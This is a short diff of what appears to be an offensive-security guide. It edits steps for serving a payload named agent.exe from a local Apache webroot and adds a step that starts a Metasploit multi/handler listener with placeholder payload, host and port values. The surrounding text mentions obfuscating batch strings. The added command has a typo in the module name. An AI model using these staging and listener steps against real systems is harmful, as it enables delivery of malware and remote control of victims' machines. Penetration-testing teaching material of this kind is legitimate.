@@ -185,11 +185,14 @@ The above string can be obfuscated using the **batch special character: "** <br 
 
 <br />
 
-      1º - store your agent.exe into your local apache webroot (linux)
+      1º - Store your agent.exe into your local apache webroot (linux)
       cp agent.exe /var/www/html/agent.exe
 
-      2º - start apache2 webserver (linux)
+      2º - Start apache2 webserver (linux)
       service apache2 start
+
+      3º - Start your agent listenner (handler)
+      msfconsole -x 'use exploit/multi/hadler; set payload <payload>; set lhost <lhost>; set lport <lport>; exploit'
 
 <br />
 
